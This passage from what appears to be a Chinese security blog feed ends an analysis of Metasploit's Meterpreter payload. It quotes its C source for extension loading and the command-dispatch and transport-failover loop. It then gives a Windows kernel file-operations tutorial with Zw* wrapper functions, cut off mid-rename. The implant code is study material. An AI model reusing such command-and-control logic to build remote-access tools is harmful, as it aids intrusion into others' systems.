class="keyword">sizeof</span>(stagelessExtensions-&gt;size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (initData != <span class="literal">NULL</span> &amp;&amp; *initData != <span class="string">'\0'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span>* extensionName = (<span class="keyword">const</span> <span class="keyword">char</span>*)initData;</span><br><span class="line">		LPBYTE data = initData + <span class="built_in">strlen</span>(extensionName) + <span class="number">1</span> + <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">		DWORD dataSize = *(DWORD*)(data - <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">		dprintf(<span class="string">"[STAGELESS] init data at %p, name %s, size is %d"</span>, extensionName, extensionName, dataSize);</span><br><span class="line">		stagelessinit_extension(extensionName, data, dataSize);</span><br><span class="line">		initData = data + dataSize;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[SERVER] All stageless extensions initialised"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后将会进入<code>server_dispatch</code>循环接受并处理攻击端发送的命令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 遍历传输，每次重新连接</span></span><br><span class="line"><span class="comment">// loop through the transports, reconnecting each time.</span></span><br><span class="line"><span class="keyword">while</span> (remote-&gt;transport)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport-&gt;transport_init)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[SERVER] attempting to initialise transport 0x%p"</span>, remote-&gt;transport);</span><br><span class="line">		<span class="comment">// 每个传输都有自己的一组重试设置，每个都应该遵守</span></span><br><span class="line">		<span class="comment">// 他们单独</span></span><br><span class="line">		<span class="comment">// Each transport has its own set of retry settings and each should honour</span></span><br><span class="line">		<span class="comment">// them individually.</span></span><br><span class="line">		<span class="keyword">if</span> (!remote-&gt;transport-&gt;transport_init(remote-&gt;transport))</span><br><span class="line">		&#123;</span><br><span class="line">			dprintf(<span class="string">"[SERVER] transport initialisation failed, moving to the next transport"</span>);</span><br><span class="line">			remote-&gt;transport = remote-&gt;transport-&gt;next_transport;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 当我们有一个传输列表时，我们将迭代到下一个</span></span><br><span class="line">			<span class="comment">// when we have a list of transports, we'll iterate to the next one.</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[SERVER] Entering the main server dispatch loop for transport %x, context %x"</span>, remote-&gt;transport, remote-&gt;transport-&gt;ctx);</span><br><span class="line">	DWORD dispatchResult = remote-&gt;transport-&gt;server_dispatch(remote, serverThread);</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[DISPATCH] dispatch exited with result: %u"</span>, dispatchResult);</span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport-&gt;transport_deinit)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[DISPATCH] deinitialising transport"</span>);</span><br><span class="line">		remote-&gt;transport-&gt;transport_deinit(remote-&gt;transport);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[TRANS] resetting transport"</span>);</span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport-&gt;transport_reset)</span><br><span class="line">	&#123;</span><br><span class="line">		remote-&gt;transport-&gt;transport_reset(remote-&gt;transport, dispatchResult == ERROR_SUCCESS &amp;&amp; remote-&gt;next_transport == <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果传输机制失败，那么我们应该循环，直到能够重新连接为止</span></span><br><span class="line">	<span class="comment">// If the transport mechanism failed, then we should loop until we're able to connect back again.</span></span><br><span class="line">	<span class="keyword">if</span> (dispatchResult == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[DISPATCH] Server requested shutdown of dispatch"</span>);</span><br><span class="line">		<span class="comment">// 但如果它成功了，这是一个有效的退出，那么我们应该清理干净离开</span></span><br><span class="line">		<span class="comment">// But if it was successful, and this is a valid exit, then we should clean up and leave.</span></span><br><span class="line">		<span class="keyword">if</span> (remote-&gt;next_transport == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dprintf(<span class="string">"[DISPATCH] No next transport specified, leaving"</span>);</span><br><span class="line">			<span class="comment">// 我们没有被要求切换传输，所以我们退出了</span></span><br><span class="line">			<span class="comment">// we weren't asked to switch transports, so we exit.</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 我们需要将传输方式改为我们已经得到的传输方式。现在我们假设，</span></span><br><span class="line">		<span class="comment">// 已经使用适当的函数创建了传输，并且它是传输列表的一部分</span></span><br><span class="line">		<span class="comment">// we need to change transports to the one we've been given. We will assume, for now,</span></span><br><span class="line">		<span class="comment">// that the transport has been created using the appropriate functions and that it is</span></span><br><span class="line">		<span class="comment">// part of the transport list.</span></span><br><span class="line">		dprintf(<span class="string">"[TRANS] Moving transport from 0x%p to 0x%p"</span>, remote-&gt;transport, remote-&gt;next_transport);</span><br><span class="line">		remote-&gt;transport = remote-&gt;next_transport;</span><br><span class="line">		remote-&gt;next_transport = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 移到列表中的下一个</span></span><br><span class="line">		<span class="comment">// move to the next one in the list</span></span><br><span class="line">		dprintf(<span class="string">"[TRANS] Moving transport from 0x%p to 0x%p"</span>, remote-&gt;transport, remote-&gt;transport-&gt;next_transport);</span><br><span class="line">		remote-&gt;transport = remote-&gt;transport-&gt;next_transport;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 传输切换和故障转移都需要支持等待功能</span></span><br><span class="line">	<span class="comment">// transport switching and failover both need to support the waiting functionality.</span></span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;next_transport_wait &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[TRANS] Sleeping for %u seconds ..."</span>, remote-&gt;next_transport_wait);</span><br><span class="line"></span><br><span class="line">		sleep(remote-&gt;next_transport_wait);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 等待是一次性的事情，需要每次重置</span></span><br><span class="line">		<span class="comment">// the wait is a once-off thing, needs to be reset each time</span></span><br><span class="line">		remote-&gt;next_transport_wait = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果我们有encryption context，就应该清除它</span></span><br><span class="line">	<span class="comment">// if we had an encryption context we should clear it up.</span></span><br><span class="line">	free_encryption_context(remote);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bbs.pediy.com/thread-247616.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247616.htm</a></p>
<p><a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads" target="_blank" rel="noopener">https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads</a></p>
<p><a href="https://blog.csdn.net/gaara_fan/article/details/6528359" target="_blank" rel="noopener">https://blog.csdn.net/gaara_fan/article/details/6528359</a></p>
<p><a href="https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter</a></p>
<hr>

]]></content>
      <categories>
        <category>病毒分析</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>Meterpreter</tag>
        <tag>payload</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows内核编程之文件操作</title>
    <url>/Windows_Kernel_File_Operate.html</url>
    <content><![CDATA[<h2 id="内核文件操作常用函数"><a href="#内核文件操作常用函数" class="headerlink" title="内核文件操作常用函数"></a>内核文件操作常用函数</h2><table>
<thead>
<tr>
<th style="text-align:center">函数功能</th>
<th style="text-align:center">内核函数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">创建文件/文件夹</td>
<td style="text-align:center">ZwCreateFile<br>IoCreateFile</td>
</tr>
<tr>
<td style="text-align:center">获取文件句柄</td>
<td style="text-align:center">ZwOpenFile</td>
</tr>
<tr>
<td style="text-align:center">删除文件/文件夹</td>
<td style="text-align:center">ZwDeleteFile</td>
</tr>
<tr>
<td style="text-align:center">写入文件</td>
<td style="text-align:center">ZwWriteFile</td>
</tr>
<tr>
<td style="text-align:center">读取文件</td>
<td style="text-align:center">ZwReadFile</td>
</tr>
<tr>
<td style="text-align:center">查询文件/文件夹信息</td>
<td style="text-align:center">ZwQueryInformationFile</td>
</tr>
<tr>
<td style="text-align:center">设置文件/文件夹信息</td>
<td style="text-align:center">ZwSetInformationFile</td>
</tr>
<tr>
<td style="text-align:center">枚举文件</td>
<td style="text-align:center">ZwQueryDirectoryFile</td>
</tr>
<tr>
<td style="text-align:center">把磁盘缓存的内容写入到磁盘扇区里</td>
<td style="text-align:center">ZwFlushBuffersFile</td>
</tr>
<tr>
<td style="text-align:center">关闭内核句柄</td>
<td style="text-align:center">ZwClose</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h2 id="内核文件操作函数封装"><a href="#内核文件操作函数封装" class="headerlink" title="内核文件操作函数封装"></a>内核文件操作函数封装</h2><h3 id="创建文件-文件夹"><a href="#创建文件-文件夹" class="headerlink" title="创建文件/文件夹"></a>创建文件/文件夹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyZwCreateFile</span></span><br><span class="line"><span class="comment">// FullName:  MyZwCreateFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 给定要创建的文件/文件夹路径，选择创建文件/文件夹</span></span><br><span class="line"><span class="comment">// Parameter: IN UNICODE_STRING FilePath 要创建的文件/文件夹路径</span></span><br><span class="line"><span class="comment">// Parameter: IN BOOLEAN IsDir	如果为TURE创建文件夹，FALSE创建文件</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyZwCreateFile</span><span class="params">(IN UNICODE_STRING FilePath,IN BOOLEAN IsDir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 文件句柄</span></span><br><span class="line">	HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// IO_STATUS_BLOCK结构一般表示一个操作的结果</span></span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 初始化含有文件路径的OBJECT_ATTRIBUTES结构</span></span><br><span class="line">	OBJECT_ATTRIBUTES oa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 创建文件/文件夹属性</span></span><br><span class="line">	ULONG ulCreateOpt = FILE_SYNCHRONOUS_IO_NONALERT;</span><br><span class="line">	<span class="comment">/*oa.Length = sizeof(oa);</span></span><br><span class="line"><span class="comment">	oa.ObjectName = &amp;FilePath;</span></span><br><span class="line"><span class="comment">	oa.Attributes = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE;</span></span><br><span class="line"><span class="comment">	oa.RootDirectory = NULL;</span></span><br><span class="line"><span class="comment">	oa.SecurityDescriptor = NULL;</span></span><br><span class="line"><span class="comment">	oa.SecurityQualityOfService = NULL;*/</span></span><br><span class="line">	<span class="comment">// OBJ_CASE_INSENSITIVE表示字符串不区分大小写</span></span><br><span class="line">	<span class="comment">// OBJ_KERNEL_HANDLE表示打开的句柄是一个内核句柄</span></span><br><span class="line">	InitializeObjectAttributes(&amp;oa, &amp;FilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 判断是要创建文件还是文件夹</span></span><br><span class="line">	ulCreateOpt = IsDir ? FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;</span><br><span class="line">	status = ZwCreateFile(</span><br><span class="line">		&amp;hFile, </span><br><span class="line">		GENERIC_ALL, </span><br><span class="line">		&amp;oa,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">		FILE_OPEN_IF,</span><br><span class="line">		ulCreateOpt,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"ZwCreateFile创建文件失败：%x\n"</span>, status));</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"ZwCreateFile创建文件成功\n"</span>));</span><br><span class="line">	<span class="comment">// 关闭内核句柄</span></span><br><span class="line">	ZwClose(hFile);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyIoCreateFile</span></span><br><span class="line"><span class="comment">// FullName:  MyIoCreateFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 给定要创建的文件/文件夹路径，选择创建文件/文件夹</span></span><br><span class="line"><span class="comment">// Parameter: IN UNICODE_STRING FilePath 要创建的文件/文件夹路径</span></span><br><span class="line"><span class="comment">// Parameter: IN BOOLEAN IsDir 如果为TURE创建文件夹，FALSE创建文件</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyIoCreateFile</span><span class="params">(IN UNICODE_STRING FilePath,IN BOOLEAN IsDir)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 文件句柄</span></span><br><span class="line">	HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// IO_STATUS_BLOCK结构一般表示一个操作的结果</span></span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 初始化含有文件路径的OBJECT_ATTRIBUTES结构</span></span><br><span class="line">	OBJECT_ATTRIBUTES oa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 创建文件/文件夹属性</span></span><br><span class="line">	ULONG ulCreateOpt = FILE_SYNCHRONOUS_IO_NONALERT;</span><br><span class="line">	<span class="comment">// OBJ_CASE_INSENSITIVE表示字符串不区分大小写</span></span><br><span class="line">	<span class="comment">// OBJ_KERNEL_HANDLE表示打开的句柄是一个内核句柄</span></span><br><span class="line">	InitializeObjectAttributes(&amp;oa, &amp;FilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">// 判断是要创建文件还是文件夹</span></span><br><span class="line">	ulCreateOpt = IsDir ? FILE_DIRECTORY_FILE : FILE_NON_DIRECTORY_FILE;</span><br><span class="line">	status = IoCreateFile(</span><br><span class="line">		&amp;hFile,</span><br><span class="line">		GENERIC_ALL,</span><br><span class="line">		&amp;oa,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">		FILE_OPEN_IF,</span><br><span class="line">		ulCreateOpt,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		CreateFileTypeNone,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		IO_NO_PARAMETER_CHECKING);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"MyIoCreateFile创建文件失败：%x\n"</span>, status));</span><br><span class="line">		<span class="comment">// 返回错误信息</span></span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"MyIoCreateFile创建文件成功\n"</span>));</span><br><span class="line">	<span class="comment">// 关闭内核句柄</span></span><br><span class="line">	ZwClose(hFile);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="读取-写入文件"><a href="#读取-写入文件" class="headerlink" title="读取/写入文件"></a>读取/写入文件</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyZwReadFile</span></span><br><span class="line"><span class="comment">// FullName:  MyZwReadFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 给定参数读取文件内容到pBuffer中</span></span><br><span class="line"><span class="comment">// Parameter: HANDLE hFile 文件句柄</span></span><br><span class="line"><span class="comment">// Parameter: PLARGE_INTEGER offset	从哪里开始读</span></span><br><span class="line"><span class="comment">// Parameter: ULONG uLength	要读多少字节</span></span><br><span class="line"><span class="comment">// Parameter: PVOID pBuffer	保存读取数据的buffer</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyZwReadFile</span><span class="params">(IN HANDLE hFile, IN PLARGE_INTEGER offset, IN ULONG uLength, OUT PVOID pBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// IO_STATUS_BLOCK结构一般表示一个操作的结果</span></span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	status = ZwReadFile(</span><br><span class="line">		hFile,</span><br><span class="line">		<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		pBuffer,</span><br><span class="line">		uLength,</span><br><span class="line">		offset,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"读取文件失败%x\n"</span>, status));</span><br><span class="line">		<span class="comment">// 关闭内核句柄</span></span><br><span class="line">		ZwClose(hFile);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"读取文件成功\n"</span>));</span><br><span class="line">	<span class="comment">// 关闭内核句柄</span></span><br><span class="line">	ZwClose(hFile);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyZwWriteFile</span></span><br><span class="line"><span class="comment">// FullName:  MyZwWriteFile</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 写入内容到指定文件</span></span><br><span class="line"><span class="comment">// Parameter: HANDLE hFile	文件句柄</span></span><br><span class="line"><span class="comment">// Parameter: PLARGE_INTEGER offset	从哪里开始写入</span></span><br><span class="line"><span class="comment">// Parameter: ULONG uLength	写入多少字节</span></span><br><span class="line"><span class="comment">// Parameter: PVOID pBuffer	要写入的内容buffer</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyZwWriteFile</span><span class="params">(IN HANDLE hFile, IN PLARGE_INTEGER offset, IN ULONG uLength, IN PVOID pBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// IO_STATUS_BLOCK结构一般表示一个操作的结果</span></span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	status = ZwWriteFile(</span><br><span class="line">		hFile,</span><br><span class="line">		<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		pBuffer,</span><br><span class="line">		uLength,</span><br><span class="line">		offset,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"写入文件失败%x\n"</span>, status));</span><br><span class="line">		<span class="comment">// 关闭内核句柄</span></span><br><span class="line">		ZwClose(hFile);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"写入文件成功\n"</span>));</span><br><span class="line">	<span class="comment">// 关闭内核句柄</span></span><br><span class="line">	ZwClose(hFile);</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="删除文件-文件夹"><a href="#删除文件-文件夹" class="headerlink" title="删除文件/文件夹"></a>删除文件/文件夹</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyDeleteFileFolder</span></span><br><span class="line"><span class="comment">// FullName:  MyDeleteFileFolder</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 删除给定的文件或文件夹路径</span></span><br><span class="line"><span class="comment">// Parameter: UNICODE_STRING FileFolderPath 文件或文件夹路径</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyDeleteFileFolder</span><span class="params">(IN UNICODE_STRING FileFolderPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// 初始化含有文件路径的OBJECT_ATTRIBUTES结构</span></span><br><span class="line">	OBJECT_ATTRIBUTES oa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// OBJ_CASE_INSENSITIVE表示字符串不区分大小写</span></span><br><span class="line">	<span class="comment">// OBJ_KERNEL_HANDLE表示打开的句柄是一个内核句柄</span></span><br><span class="line">	InitializeObjectAttributes(&amp;oa, &amp;FileFolderPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	status = ZwDeleteFile(&amp;oa);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"删除文件/文件夹失败%x\n"</span>,status));</span><br><span class="line">		<span class="comment">// 返回错误信息</span></span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line">	KdPrint((<span class="string">"删除文件/文件夹成功\n"</span>));</span><br><span class="line">	<span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取文件大小"><a href="#获取文件大小" class="headerlink" title="获取文件大小"></a>获取文件大小</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    GetFileSize</span></span><br><span class="line"><span class="comment">// FullName:  GetFileSize</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   ULONG64</span></span><br><span class="line"><span class="comment">// Qualifier: 给定文件句柄返回文件大小</span></span><br><span class="line"><span class="comment">// Parameter: HANDLE hFile	文件句柄</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">ULONG64 <span class="title">MyGetFileSize</span><span class="params">(IN HANDLE hFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// IO_STATUS_BLOCK结构一般表示一个操作的结果</span></span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	FILE_STANDARD_INFORMATION fsi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	status = ZwQueryInformationFile(</span><br><span class="line">		hFile,</span><br><span class="line">		&amp;IoStatus,</span><br><span class="line">		&amp;fsi,</span><br><span class="line">		<span class="keyword">sizeof</span>(FILE_STANDARD_INFORMATION),</span><br><span class="line">		FileStandardInformation);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"文件信息查询失败：%x\n"</span>, status));</span><br><span class="line">		<span class="comment">// 关闭内核句柄</span></span><br><span class="line">		ZwClose(hFile);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 返回值为当前文件大小</span></span><br><span class="line">	<span class="keyword">return</span> fsi.EndOfFile.QuadPart;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="重命名文件-文件夹名字"><a href="#重命名文件-文件夹名字" class="headerlink" title="重命名文件/文件夹名字"></a>重命名文件/文件夹名字</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// Method:    MyRenameFileFolder</span></span><br><span class="line"><span class="comment">// FullName:  MyRenameFileFolder</span></span><br><span class="line"><span class="comment">// Access:    public </span></span><br><span class="line"><span class="comment">// Returns:   NTSTATUS</span></span><br><span class="line"><span class="comment">// Qualifier: 输入新的文件/文件夹名称对指定的文件/文件夹进行重命名</span></span><br><span class="line"><span class="comment">// Parameter: UNICODE_STRING FileFolderPath 需要重命名的文件/文件夹</span></span><br><span class="line"><span class="comment">// Parameter: UNICODE_STRING NewFileFolderPathName 新的文件/文件夹名称</span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyRenameFileFolder</span><span class="params">(IN UNICODE_STRING FileFolderPath, IN UNICODE_STRING NewFileFolderPathName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 返回值</span></span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	<span class="comment">// 文件句柄</span></span><br><span class="line">	HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 初始化含有文件路径的OBJECT_ATTRIBUTES结构</span></span><br><span class="line">	OBJECT_ATTRIBUTES oa = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// IO_STATUS_BLOCK结构一般表示一个操作的结果</span></span><br><span class="line">	IO_STATUS_BLOCK IoStatus = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">// 重命名文件/文件夹需要用到的结构</span></span><br><span class="line">	PFILE_RENAME_INFORMATION RenameInfo = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG ulLength = (<span class="keyword">sizeof</span>(FILE_RENAME_INFORMATION) + <span class="number">2048</span>);</span><br><span class="line">	<span class="comment">// 为FILE_RENAME_INFORMATION结构申请内存</span></span><br><span class="line">	RenameInfo = ExAllocatePool(PagedPool, ulLength);</span><br><span class="line">	<span class="keyword">if</span> (RenameInfo == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		KdPrint((<span class="string">"初始化FILE_RENAME_INFORMATION结构失败\n"</span>));</span><br><span class="line">		<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 初始化FILE_RENAME_INFORMATION结构内存</span></span><br><span class="line">	RtlZeroMemory(RenameInfo, ulLength);</span><br><span class="line">	<span class="comment">// 设置重命名长度</span></span><br><span class="line">	RenameInfo-&gt;FileNameLength = NewFileFolderPathName.Length;</span><br><span class="line">	<span class="comment">// 设置重命名名称</span></span><br><span class="line">	wcscpy(RenameInfo-&gt;FileName, NewFileFolderPathName.Buffer);</span><br><span class="line">	RenameInfo-&gt;ReplaceIfExists = <span class="number">0</span>;</span><br><span class="line">	RenameInfo-&gt;RootDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	InitializeObjectAttributes(&amp;oa, &amp;FileFolderPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	status = ZwCreateFile(</span><br><span class="line">		&amp;hFile, </span><br><span class="line">		SYNCHRONIZE | DELETE, </span><br><span class="line">		